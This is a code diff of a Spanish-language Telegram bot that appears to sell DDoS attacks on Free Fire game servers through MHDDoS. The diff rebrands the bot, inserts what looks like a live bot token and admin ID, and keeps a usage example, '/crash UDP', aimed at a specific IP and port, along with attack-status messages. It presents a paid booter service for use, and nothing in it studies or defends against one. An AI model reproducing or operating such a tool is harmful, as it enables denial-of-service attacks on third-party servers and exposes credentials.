@@ -6,8 +6,8 @@ from threading import Lock
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TOKEN AQUI"
-ADMIN_ID = 7178876305
+BOT_TOKEN = "7855848524:AAF0HeNyigYj5EDtVg9UZ62CkRFuqC96ri4"
+ADMIN_ID = 7846137224
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -56,7 +56,7 @@ def handle_start(message):
         vip_status = "❌ *No tienes un plan vip activo.*"
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
-        text="💻 VENDEDOR - OFICIAL 💻",
+        text="💻 COMPRAR - VIP 💻",
         url=f"tg://user?id={ADMIN_ID}"
 
     )
@@ -65,7 +65,7 @@ def handle_start(message):
     bot.reply_to(
         message,
         (
-            "🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*"
+            "🤖 *BIENVENIDO AL PROJEC BOT [Free Fire]!*"
             
 
             f"""
@@ -79,7 +79,7 @@ def handle_start(message):
             """
 ```
 /crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            "💠 INOSUKE ❤️‍🩹 USERS VIP 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -178,7 +178,7 @@ def handle_ping(message):
             f"⚙️ *Tipo:* {attack_type}\n"
             f"🧟‍♀️ *Threads:* {threads}\n"
             f"⏳ *Tiempo (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            f"💠 INOSUKE ❤️‍🩹 USERS VIP 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
